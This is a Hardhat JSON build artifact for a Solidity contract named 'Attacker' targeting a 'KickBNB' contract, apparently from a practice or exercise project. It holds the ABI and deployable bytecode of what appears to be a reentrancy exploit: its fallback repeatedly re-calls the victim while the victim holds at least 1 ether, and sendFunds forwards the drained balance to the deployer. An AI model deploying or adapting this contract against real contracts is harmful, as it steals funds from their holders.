{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/KickBNB.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "kickBNB",
      "outputs": [
        {
          "internalType": "contract KickBNB",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "sendFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "val",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260405161077938038061077983398181016040528101906100259190610241565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636955c93b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100d3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100f791906102a4565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a035b1fe6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610164573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061018891906102a4565b6101929190610300565b600281905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610331565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061020e826101e3565b9050919050565b61021e81610203565b811461022957600080fd5b50565b60008151905061023b81610215565b92915050565b600060208284031215610257576102566101de565b5b60006102658482850161022c565b91505092915050565b6000819050919050565b6102818161026e565b811461028c57600080fd5b50565b60008151905061029e81610278565b92915050565b6000602082840312156102ba576102b96101de565b5b60006102c88482850161028f565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061030b8261026e565b91506103168361026e565b925082610326576103256102d1565b5b828204905092915050565b610439806103406000396000f3fe6080604052600436106100435760003560e01c80633c6bb436146101115780638d68cf591461013c5780639e5faafc14610153578063cdcb6bdc1461015d57610044565b5b670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061010f57600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ea8a1af06040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f657600080fd5b505af115801561010a573d6000803e3d6000fd5b505050505b005b34801561011d57600080fd5b50610126610188565b604051610133919061034e565b60405180910390f35b34801561014857600080fd5b5061015161018e565b005b61015b6101f7565b005b34801561016957600080fd5b5061017261030f565b60405161017f91906103e8565b60405180910390f35b60025481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101f4573d6000803e3d6000fd5b50565b60025434101561020657600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db06002546040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027257600080fd5b505af1158015610286573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ea8a1af06040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f557600080fd5b505af1158015610309573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b61034881610335565b82525050565b6000602082019050610363600083018461033f565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103ae6103a96103a484610369565b610389565b610369565b9050919050565b60006103c082610393565b9050919050565b60006103d2826103b5565b9050919050565b6103e2816103c7565b82525050565b60006020820190506103fd60008301846103d9565b9291505056fea2646970667358221220712135eaebc42a82ebe62701c4db646e989423c1e979c62fefd0c469b235383864736f6c634300080a0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}